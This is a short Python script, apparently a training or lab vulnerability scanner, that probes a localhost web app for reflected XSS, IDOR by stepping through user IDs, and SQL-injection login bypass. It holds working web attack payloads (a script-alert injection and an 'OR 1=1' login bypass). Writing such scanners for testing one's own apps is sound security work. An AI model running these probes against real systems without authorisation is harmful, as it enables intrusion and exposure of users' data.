import requests

TARGET = "http://localhost:8080"

def check_xss():
    print("\n[*] Testing XSS...")
    payload = "<script>alert('XSS')</script>"
    r = requests.get(f"{TARGET}/hello", params={"name": payload})
    if payload in r.text:
        print(f"[FOUND] XSS vulnerability! Payload reflected in response")
    else:
        print("[ ] XSS not found")

def check_idor():
    print("\n[*] Testing IDOR...")
    for user_id in range(1, 4):
        r = requests.get(f"{TARGET}/user/{user_id}")
        if r.status_code == 200 and "username" in r.text:
            print(f"[FOUND] IDOR! User {user_id} data exposed: {r.text}")
        else:
            print(f"[ ] User {user_id} not found")

def check_sqli():
    print("\n[*] Testing SQLi...")
    payload = "admin' OR '1'='1"
    r = requests.get(f"{TARGET}/login", 
                     params={"username": payload, "password": "wrong"})
    if "Welcome" in r.text:
        print(f"[FOUND] SQLi vulnerability! Bypassed login with: {payload}")
    else:
        print("[ ] SQLi not found (or protected)")

if __name__ == "__main__":
    print("=== AppSec Scanner ===")
    print(f"Target: {TARGET}")
    check_xss()
    check_idor()
    check_sqli()
    print("\n=== Scan complete ===")
